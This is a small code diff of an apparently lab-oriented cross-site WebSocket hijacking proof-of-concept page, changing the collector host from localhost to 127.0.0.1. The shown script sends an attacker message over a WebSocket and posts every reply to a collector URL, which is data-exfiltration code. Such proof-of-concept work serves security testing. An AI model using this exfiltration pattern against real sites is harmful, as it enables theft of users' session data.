@@ -15,7 +15,7 @@
       websocket.send("attackers-message");
     }
     function handleReply(event) {
-      fetch('http://localhost/CSWSH/', {method:'POST',mode:'no-cors',body:event.data})
+      fetch('http://127.0.0.1/CSWSH/', {method:'POST',mode:'no-cors',body:event.data})
     }
   </script>
 </body>
